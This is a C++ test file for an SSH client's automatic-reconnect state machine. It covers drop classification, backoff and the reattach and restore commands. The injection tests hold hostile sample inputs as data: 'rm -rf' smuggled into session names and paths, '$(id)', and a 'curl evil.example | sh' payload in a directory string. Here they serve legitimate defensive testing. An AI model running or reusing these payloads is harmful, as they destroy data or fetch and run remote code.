// GuardianTests.cpp — the Stage 2 reconnect state machine.
//
// The whole point of putting Guardian in its own translation unit with no
// Windows, no libssh2 and no terminal in it is that every rule below can be
// asserted without a network: the security gates, the backoff ladder, the
// retry limit, the reattach commands and the restore plan. Anything that
// genuinely needs a server going away is in the manual matrix in
// docs/STAGE2-GUARDIAN-REPORT.md, and is listed there as unproven.
#include <catch2/catch_test_macros.hpp>

#include "../src/sessions/Guardian.h"

#include <set>
#include <string>

using namespace amber;

namespace
{

GuardianPolicy Auto(int maxAttempts = 6, int jitter = 0)
{
    GuardianPolicy p;
    p.mode = ReconnectMode::Automatic;
    p.maxAttempts = maxAttempts;
    p.jitterPercent = jitter;
    p.seed = 12345u;
    return p;
}

// A guardian that has connected once, which is the only state in which
// reconnect is ever armed.
Guardian Live(const GuardianPolicy& p, double t = 100.0)
{
    Guardian g;
    g.Configure(p);
    g.OnConnected(t);
    return g;
}

} // namespace

// ------------------------------------------------------------- classification
TEST_CASE("drop classification separates the security gates from the rest")
{
    SECTION("a host key problem is never anything else")
    {
        // Each of these is a real message from src/ssh/session.cpp.
        for (const char* r : {
                 "HOST KEY MISMATCH for example.com - possible man-in-the-middle. "
                 "Remove the old entry from known_hosts to continue.",
                 "host key is not in the configured list. Fingerprint: ssh-ed25519 SHA256:abc",
                 "host key rejected",
             })
        {
            CHECK(ClassifyDrop(r) == DropClass::HostKeyAttention);
            CHECK_FALSE(RetryableClass(ClassifyDrop(r)));
        }
    }
    SECTION("authentication problems stop reconnect")
    {
        for (const char* r : {
                 "authentication failed (check user/password)",
                 "private key authentication failed: unable to open private key file",
                 "no agent identity was accepted by the server",
                 "no SSH agent is running (start ssh-agent or Pageant)",
             })
        {
            CHECK(ClassifyDrop(r) == DropClass::AuthRequired);
            CHECK_FALSE(RetryableClass(ClassifyDrop(r)));
        }
    }
    SECTION("configuration errors are fatal, because a retry repeats them")
    {
        for (const char* r : {
                 "jump host (bastion) is configured but ProxyJump tunnelling is "
                 "not yet supported in this build",
                 "could not resolve host \"nosuch.example\"",
                 "PTY request failed",
                 "shell request failed",
                 "could not open channel",
             })
        {
            CHECK(ClassifyDrop(r) == DropClass::Fatal);
            CHECK_FALSE(RetryableClass(ClassifyDrop(r)));
        }
    }
    SECTION("a clean end is not a fault and is not retried")
    {
        for (const char* r : { "remote closed the session", "the shell exited",
                               "the shell exited with code 3",
                               "the shell closed its input", "port closed" })
            CHECK(ClassifyDrop(r) == DropClass::RemoteClosed);
        CHECK_FALSE(RetryableClass(DropClass::RemoteClosed));
    }
    SECTION("a socket EOF is not the same thing as a shell exiting")
    {
        // A telnet/raw peer hanging up is what a server restart and an idle
        // timeout both look like, so it IS retried; an SSH shell ending is
        // the user typing exit, so it is not.
        CHECK(ClassifyDrop("remote closed the connection") == DropClass::Transient);
        CHECK(ClassifyDrop("remote closed the session") == DropClass::RemoteClosed);
    }
    SECTION("a serial device disappearing is retried, so replugging recovers")
    {
        CHECK(ClassifyDrop("serial port error (device removed?)") ==
              DropClass::Transient);
    }
    SECTION("transport failures are what reconnect is for")
    {
        for (const char* r : {
                 "connection timed out after 15 s",
                 "connection failed (winsock 10054)",
                 "read error",
                 "write error",
                 "connection closed",
             })
        {
            CHECK(ClassifyDrop(r) == DropClass::Transient);
            CHECK(RetryableClass(ClassifyDrop(r)));
        }
    }
    SECTION("an unrecognised reason is transient, never a security class")
    {
        // The default has to be safe. It is safe because Guardian only arms
        // after a successful connect, and because the two security classes
        // are matched explicitly rather than by falling through to here.
        const DropClass c = ClassifyDrop("something nobody has written yet");
        CHECK(c == DropClass::Transient);
        CHECK(c != DropClass::AuthRequired);
        CHECK(c != DropClass::HostKeyAttention);
    }
}

// -------------------------------------------------------------------- backoff
TEST_CASE("backoff climbs the ladder and then holds")
{
    CHECK(BackoffSeconds(1) == 1);
    CHECK(BackoffSeconds(2) == 2);
    CHECK(BackoffSeconds(3) == 5);
    CHECK(BackoffSeconds(4) == 10);
    CHECK(BackoffSeconds(5) == 30);
    CHECK(BackoffSeconds(6) == 30);
    CHECK(BackoffSeconds(99) == 30);

    SECTION("attempt numbers below one are clamped, never negative delays")
    {
        CHECK(BackoffSeconds(0) == 1);
        CHECK(BackoffSeconds(-3) == 1);
    }
    SECTION("no jitter means exactly the ladder")
    {
        for (int a = 1; a <= 8; ++a)
            CHECK(BackoffDelay(a, 0, 999u) == static_cast<double>(BackoffSeconds(a)));
    }
    SECTION("jitter stays inside its band and is reproducible")
    {
        for (int a = 1; a <= 8; ++a)
        {
            const double base = BackoffSeconds(a);
            const double d = BackoffDelay(a, 20, 4242u);
            CHECK(d >= base * 0.8 - 1e-9);
            CHECK(d <= base * 1.2 + 1e-9);
            CHECK(d == BackoffDelay(a, 20, 4242u));   // same input, same wait
        }
    }
    SECTION("a delay is never zero, so a jittered retry can never spin")
    {
        for (int a = 1; a <= 8; ++a)
            CHECK(BackoffDelay(a, 50, 7u) >= 0.25);
    }
    SECTION("two profiles do not retry in lockstep")
    {
        // This is the anti-stampede property: same ladder, different offsets.
        const uint32_t a = SeedFromId("11111111-1111-4111-8111-111111111111");
        const uint32_t b = SeedFromId("22222222-2222-4222-8222-222222222222");
        CHECK(a != b);
        int differing = 0;
        for (int k = 1; k <= 5; ++k)
            if (BackoffDelay(k, 25, a) != BackoffDelay(k, 25, b))
                ++differing;
        CHECK(differing >= 4);
    }
    SECTION("the seed is stable and never zero")
    {
        CHECK(SeedFromId("abc") == SeedFromId("abc"));
        CHECK(SeedFromId("") != 0u);
    }
}

// ------------------------------------------------------------- state machine
TEST_CASE("a transient drop is retried with backoff")
{
    Guardian g = Live(Auto());
    CHECK(g.State() == GuardianState::Connected);

    g.OnDrop("read error", 200.0);
    CHECK(g.State() == GuardianState::WaitingToReconnect);
    CHECK(g.Attempt() == 1);
    CHECK(g.NextAt() == 201.0);            // no jitter configured

    SECTION("Tick does nothing until the wait has elapsed")
    {
        CHECK_FALSE(g.Tick(200.5));
        CHECK(g.State() == GuardianState::WaitingToReconnect);
        CHECK(g.Tick(201.0));
        CHECK(g.State() == GuardianState::Reconnecting);
    }
    SECTION("Tick fires once per attempt, never twice")
    {
        REQUIRE(g.Tick(201.0));
        CHECK_FALSE(g.Tick(201.0));
        CHECK_FALSE(g.Tick(260.0));        // still Reconnecting: no duplicate
    }
    SECTION("successive failures walk up the ladder")
    {
        REQUIRE(g.Tick(201.0));
        g.OnDrop("read error", 202.0);
        CHECK(g.Attempt() == 2);
        CHECK(g.NextAt() == 204.0);        // +2
        REQUIRE(g.Tick(204.0));
        g.OnDrop("read error", 205.0);
        CHECK(g.Attempt() == 3);
        CHECK(g.NextAt() == 210.0);        // +5
    }
    SECTION("reconnecting clears the counter and reports the outage")
    {
        REQUIRE(g.Tick(201.0));
        g.OnConnected(206.2);
        CHECK(g.State() == GuardianState::Reconnected);
        CHECK(g.JustReconnected());
        CHECK(g.Attempt() == 0);
        CHECK(g.LastOutageSec() > 6.19);
        CHECK(g.LastOutageSec() < 6.21);
        // Reconnected is a report, not somewhere to live.
        g.Tick(213.0);
        CHECK(g.State() == GuardianState::Connected);
    }
}

TEST_CASE("automatic reconnect never drives past a security question")
{
    SECTION("a changed host key stops everything")
    {
        Guardian g = Live(Auto(0));      // 0 = unlimited attempts
        g.OnDrop("HOST KEY MISMATCH for example.com - possible man-in-the-middle",
                 200.0);
        CHECK(g.State() == GuardianState::HostKeyAttention);
        CHECK(GuardianTerminal(g.State()));
        CHECK_FALSE(g.Armed());
        // Not one attempt, not now and not ever on its own.
        for (double t = 200.0; t < 3600.0; t += 7.0)
            REQUIRE_FALSE(g.Tick(t));
    }
    SECTION("a failed authentication stops everything")
    {
        Guardian g = Live(Auto(0));
        g.OnDrop("authentication failed (check user/password)", 200.0);
        CHECK(g.State() == GuardianState::AuthenticationRequired);
        for (double t = 200.0; t < 3600.0; t += 11.0)
            REQUIRE_FALSE(g.Tick(t));
    }
    SECTION("a missing passphrase stops everything")
    {
        Guardian g = Live(Auto(0));
        g.OnDrop("private key authentication failed: bad passphrase", 200.0);
        CHECK(g.State() == GuardianState::AuthenticationRequired);
        CHECK_FALSE(g.Tick(9999.0));
    }
    SECTION("only an explicit human action moves off a gate, and it still authenticates")
    {
        Guardian g = Live(Auto());
        g.OnDrop("host key rejected", 200.0);
        REQUIRE(g.State() == GuardianState::HostKeyAttention);
        g.RetryNow(300.0);
        CHECK(g.State() == GuardianState::WaitingToReconnect);
        CHECK(g.Tick(300.0));
        // The attempt that runs is an ordinary connection: Guardian has no
        // way to skip the host-key check, because it never touches it.
    }
}

TEST_CASE("a clean remote exit is not treated as a fault")
{
    Guardian g = Live(Auto(0));
    g.OnDrop("remote closed the session", 200.0);
    CHECK(g.State() == GuardianState::ConnectionLost);
    CHECK_FALSE(g.Armed());
    CHECK_FALSE(g.Tick(500.0));
}

TEST_CASE("reconnect does not arm before the first successful connect")
{
    // A wrong host or a wrong password on the FIRST connect is a settings
    // problem. Retrying it would just replay the mistake on a timer.
    Guardian g;
    g.Configure(Auto());
    g.OnDrop("connection timed out after 15 s", 100.0);
    CHECK(g.State() == GuardianState::Idle);
    CHECK_FALSE(g.Armed());
    CHECK_FALSE(g.Tick(1000.0));
    CHECK_FALSE(g.EverConnected());
}

TEST_CASE("the retry limit is honoured and giving up is final until asked")
{
    Guardian g = Live(Auto(3));
    double t = 200.0;
    for (int i = 1; i <= 3; ++i)
    {
        g.OnDrop("read error", t);
        REQUIRE(g.State() == GuardianState::WaitingToReconnect);
        REQUIRE(g.Attempt() == i);
        t = g.NextAt();
        REQUIRE(g.Tick(t));
        t += 0.5;
    }
    g.OnDrop("read error", t);
    CHECK(g.State() == GuardianState::GaveUp);
    CHECK(g.Attempt() == 3);              // three made, not four
    CHECK_FALSE(g.Tick(t + 10000.0));

    SECTION("Reconnect Now is the way back")
    {
        g.RetryNow(t + 5.0);
        CHECK(g.State() == GuardianState::WaitingToReconnect);
        CHECK(g.Attempt() == 0);
        CHECK(g.Tick(t + 5.0));
    }
}

TEST_CASE("unlimited retries keep going but still back off")
{
    Guardian g = Live(Auto(0));
    double t = 200.0;
    for (int i = 1; i <= 40; ++i)
    {
        g.OnDrop("read error", t);
        REQUIRE(g.State() == GuardianState::WaitingToReconnect);
        REQUIRE(g.Attempt() == i);
        REQUIRE(g.NextAt() - t >= 1.0);          // never a tight loop
        REQUIRE(g.NextAt() - t <= 30.0);
        t = g.NextAt();
        REQUIRE(g.Tick(t));
    }
    CHECK(g.State() == GuardianState::Reconnecting);
}

TEST_CASE("Off means off")
{
    GuardianPolicy p = Auto();
    p.mode = ReconnectMode::Off;
    Guardian g = Live(p);
    g.OnDrop("read error", 200.0);
    CHECK(g.State() == GuardianState::ConnectionLost);
    CHECK_FALSE(g.Armed());
    CHECK_FALSE(g.Tick(400.0));
}

TEST_CASE("Ask asks once per outage, not once per attempt")
{
    GuardianPolicy p = Auto();
    p.mode = ReconnectMode::Ask;
    Guardian g = Live(p);

    g.OnDrop("read error", 200.0);
    CHECK(g.State() == GuardianState::ConnectionLost);
    CHECK(g.NeedsConsent());
    CHECK_FALSE(g.Tick(400.0));           // nothing happens while it waits

    SECTION("declining stops the episode")
    {
        g.GrantConsent(false, 201.0);
        CHECK(g.State() == GuardianState::UserStopped);
        CHECK_FALSE(g.NeedsConsent());
        CHECK_FALSE(g.Tick(999.0));
    }
    SECTION("accepting arms it, and later attempts do not ask again")
    {
        g.GrantConsent(true, 201.0);
        CHECK(g.State() == GuardianState::WaitingToReconnect);
        CHECK(g.Attempt() == 1);
        REQUIRE(g.Tick(202.0));
        g.OnDrop("read error", 203.0);
        CHECK_FALSE(g.NeedsConsent());    // same outage, no second question
        CHECK(g.State() == GuardianState::WaitingToReconnect);
        CHECK(g.Attempt() == 2);
    }
    SECTION("a NEW outage asks again")
    {
        g.GrantConsent(true, 201.0);
        REQUIRE(g.Tick(202.0));
        g.OnConnected(203.0);
        g.OnDrop("read error", 400.0);
        CHECK(g.NeedsConsent());
    }
}

TEST_CASE("a manual disconnect is never reconnected")
{
    Guardian g = Live(Auto(0));
    g.OnUserDisconnect();
    g.OnDrop("disconnected", 200.0);
    CHECK(g.State() == GuardianState::Idle);
    CHECK_FALSE(g.Armed());
    CHECK_FALSE(g.Tick(10000.0));

    SECTION("asking for it back explicitly still works")
    {
        g.RetryNow(300.0);
        CHECK(g.Tick(300.0));
    }
}

TEST_CASE("the user can stop a reconnect that is already running")
{
    Guardian g = Live(Auto(0));
    g.OnDrop("read error", 200.0);
    REQUIRE(g.Armed());
    g.StopByUser();
    CHECK(g.State() == GuardianState::UserStopped);
    CHECK_FALSE(g.Tick(100000.0));

    SECTION("stopping a healthy session does nothing")
    {
        Guardian h = Live(Auto());
        h.StopByUser();
        CHECK(h.State() == GuardianState::Connected);
    }
}

TEST_CASE("shutting down during the reconnect wait leaves nothing scheduled")
{
    // The app tears a session down by disconnecting it; the guardian must not
    // then hand back an attempt on the next frame.
    Guardian g = Live(Auto(0));
    g.OnDrop("read error", 200.0);
    REQUIRE(g.State() == GuardianState::WaitingToReconnect);
    g.OnUserDisconnect();
    CHECK(g.State() == GuardianState::Idle);
    for (double t = 200.0; t < 900.0; t += 1.0)
        REQUIRE_FALSE(g.Tick(t));
}

TEST_CASE("status text reports the machine and never speculates")
{
    Guardian g = Live(Auto(4));
    CHECK(g.StatusText(100.0).empty());          // connected: nothing to say

    g.OnDrop("read error", 200.0);
    const std::string wait = g.StatusText(200.0);
    CHECK(wait.find("attempt 1 of 4") != std::string::npos);

    g.Tick(g.NextAt());
    CHECK(g.StatusText(202.0).find("reconnecting (attempt 1 of 4)") !=
          std::string::npos);

    g.OnConnected(206.5);
    CHECK(g.StatusText(206.5).find("reconnected after") != std::string::npos);

    SECTION("unlimited attempts do not print a limit")
    {
        Guardian h = Live(Auto(0));
        h.OnDrop("read error", 200.0);
        CHECK(h.StatusText(200.0).find(" of ") == std::string::npos);
    }
    SECTION("a stopped reconnect says why")
    {
        Guardian h = Live(Auto());
        h.OnDrop("HOST KEY MISMATCH for example.com", 200.0);
        CHECK(h.StatusText(200.0).find("host key") != std::string::npos);
    }
}

// ------------------------------------------------------------------ reattach
TEST_CASE("reattach commands are conservative and never destructive")
{
    std::string err;
    SECTION("tmux attaches if it can and creates if it must")
    {
        const std::string c = ReattachCommand(ReattachMode::Tmux, "work", "", err);
        CHECK(err.empty());
        CHECK(c == "tmux attach-session -t 'work' || tmux new-session -s 'work'");
        // The things that would throw somebody off, or lose their work.
        CHECK(c.find("kill") == std::string::npos);
        CHECK(c.find(" -d") == std::string::npos);
    }
    SECTION("screen resumes or creates, and never detaches anyone")
    {
        const std::string c = ReattachCommand(ReattachMode::Screen, "work", "", err);
        CHECK(err.empty());
        CHECK(c == "screen -R 'work'");
        CHECK(c.find("-D") == std::string::npos);
        CHECK(c.find("wipe") == std::string::npos);
    }
    SECTION("None is empty and is not an error")
    {
        CHECK(ReattachCommand(ReattachMode::None, "work", "", err).empty());
        CHECK(err.empty());
    }
    SECTION("a custom command is passed through exactly, once trimmed")
    {
        CHECK(ReattachCommand(ReattachMode::Custom, "", "  zellij attach main  ", err) ==
              "zellij attach main");
        CHECK(err.empty());
    }
    SECTION("an empty custom command is refused rather than sending a bare newline")
    {
        CHECK(ReattachCommand(ReattachMode::Custom, "", "   ", err).empty());
        CHECK_FALSE(err.empty());
    }
    SECTION("a multi-line custom command is refused")
    {
        CHECK(ReattachCommand(ReattachMode::Custom, "", "a\nrm -rf /", err).empty());
        CHECK_FALSE(err.empty());
    }
}

TEST_CASE("a session name cannot smuggle a shell command")
{
    CHECK(ValidReattachName("work"));
    CHECK(ValidReattachName("build-2.4_x"));
    SECTION("everything a shell would act on is refused")
    {
        for (const char* bad : { "a'; rm -rf ~ ;'", "a b", "a;b", "a|b", "a$b",
                                 "a`b`", "a&b", "a>b", "a\nb", "$(id)", "", "a\\b" })
            CHECK_FALSE(ValidReattachName(bad));
    }
    SECTION("an invalid name yields no command at all, and says so")
    {
        std::string err;
        CHECK(ReattachCommand(ReattachMode::Tmux, "a; rm -rf ~", "", err).empty());
        CHECK_FALSE(err.empty());
        CHECK(ReattachCommand(ReattachMode::Screen, "", "", err).empty());
        CHECK_FALSE(err.empty());
    }
    SECTION("a name longer than 64 characters is refused")
    {
        CHECK_FALSE(ValidReattachName(std::string(65, 'a')));
        CHECK(ValidReattachName(std::string(64, 'a')));
    }
}

// -------------------------------------------------------------- restore plan
TEST_CASE("the restore plan only ever contains what the profile asked for")
{
    std::string err;
    SECTION("nothing configured means nothing sent")
    {
        RestoreRequest r;
        CHECK(BuildRestorePlan(r, err).empty());
        CHECK(err.empty());
    }
    SECTION("reattach alone")
    {
        RestoreRequest r;
        r.reattach = ReattachMode::Tmux;
        r.reattachSession = "work";
        r.cwd = "/srv/app";
        const auto plan = BuildRestorePlan(r, err);
        REQUIRE(plan.size() == 1);
        CHECK(plan[0].kind == RestoreStep::Kind::Reattach);
    }
    SECTION("the directory is restored only when there is no multiplexer")
    {
        // tmux and screen bring their own panes back, each already where it
        // was; a cd on top of that would move the user somewhere new.
        RestoreRequest r;
        r.restoreCwd = true;
        r.cwd = "/srv/app";
        auto plan = BuildRestorePlan(r, err);
        REQUIRE(plan.size() == 1);
        CHECK(plan[0].kind == RestoreStep::Kind::ChangeDirectory);
        CHECK(plan[0].text == "cd '/srv/app'");

        r.reattach = ReattachMode::Tmux;
        r.reattachSession = "work";
        plan = BuildRestorePlan(r, err);
        REQUIRE(plan.size() == 1);
        CHECK(plan[0].kind == RestoreStep::Kind::Reattach);
    }
    SECTION("an unknown directory is simply not restored")
    {
        RestoreRequest r;
        r.restoreCwd = true;
        CHECK(BuildRestorePlan(r, err).empty());
        CHECK(err.empty());
    }
    SECTION("nothing the user typed is ever replayed")
    {
        // The plan is a closed set of two kinds. There is no path by which a
        // command from the scrollback can enter it.
        RestoreRequest r;
        r.reattach = ReattachMode::Custom;
        r.reattachCustom = "tmux attach";
        r.restoreCwd = true;
        r.cwd = "/tmp";
        const auto plan = BuildRestorePlan(r, err);
        for (const RestoreStep& s : plan)
            CHECK((s.kind == RestoreStep::Kind::Reattach ||
                   s.kind == RestoreStep::Kind::ChangeDirectory));
    }
}

TEST_CASE("a directory from the wire cannot become a command")
{
    std::string err;
    SECTION("quotes in a path are escaped, not closed")
    {
        CHECK(ShellQuote("/srv/it's here") == "'/srv/it'\\''s here'");
        CHECK(ShellQuote("/a;rm -rf ~") == "'/a;rm -rf ~'");
        CHECK(ShellQuote("$(id)") == "'$(id)'");
        CHECK(ShellQuote("") == "''");
    }
    SECTION("a hostile OSC 7 payload stays inside its quotes")
    {
        RestoreRequest r;
        r.restoreCwd = true;
        r.cwd = "/tmp'; curl evil.example | sh; '";
        const auto plan = BuildRestorePlan(r, err);
        REQUIRE(plan.size() == 1);
        // Every apostrophe in the payload was neutralised, so the command is
        // one cd with one argument.
        CHECK(plan[0].text.rfind("cd '", 0) == 0);
        CHECK(plan[0].text.find("'\\''") != std::string::npos);
    }
    SECTION("control characters are refused outright rather than quoted")
    {
        CHECK_FALSE(SafeCwd("/tmp\nrm -rf ~"));
        CHECK_FALSE(SafeCwd("/tmp\rwhoami"));
        CHECK_FALSE(SafeCwd(std::string("/tmp\x1b[31m")));
        CHECK_FALSE(SafeCwd(""));
        CHECK(SafeCwd("/srv/app"));

        RestoreRequest r;
        r.restoreCwd = true;
        r.cwd = "/tmp\nrm -rf ~";
        CHECK(BuildRestorePlan(r, err).empty());
        CHECK_FALSE(err.empty());          // refused, and said so
    }
}

// ------------------------------------------------- interrupted-command record
TEST_CASE("an interrupted command carries no invented exit code")
{
    InterruptedCommand ic;
    ic.command = "make -j8";
    ic.startedAt = 1700000000;
    ic.ranForSec = 42.0;
    // There is deliberately no exit-code field to fill in: the type cannot
    // express a status AmberSSH never saw.
    CHECK(ic.command == "make -j8");
    CHECK(ic.ranForSec == 42.0);
}

// ------------------------------------------------------------------ profiles
TEST_CASE("guardian states all have names, for the status bar and the report")
{
    std::set<std::string> seen;
    for (GuardianState s : { GuardianState::Idle, GuardianState::Connected,
                             GuardianState::ConnectionLost,
                             GuardianState::WaitingToReconnect,
                             GuardianState::Reconnecting,
                             GuardianState::AuthenticationRequired,
                             GuardianState::HostKeyAttention,
                             GuardianState::Reconnected, GuardianState::GaveUp,
                             GuardianState::UserStopped })
    {
        const std::string n = GuardianStateName(s);
        CHECK_FALSE(n.empty());
        CHECK(n != "unknown");
        CHECK(seen.insert(n).second);      // every state is distinguishable
    }
    for (DropClass c : { DropClass::Transient, DropClass::RemoteClosed,
                         DropClass::AuthRequired, DropClass::HostKeyAttention,
                         DropClass::Fatal, DropClass::UserInitiated })
        CHECK(std::string(DropClassName(c)) != "unknown");
}
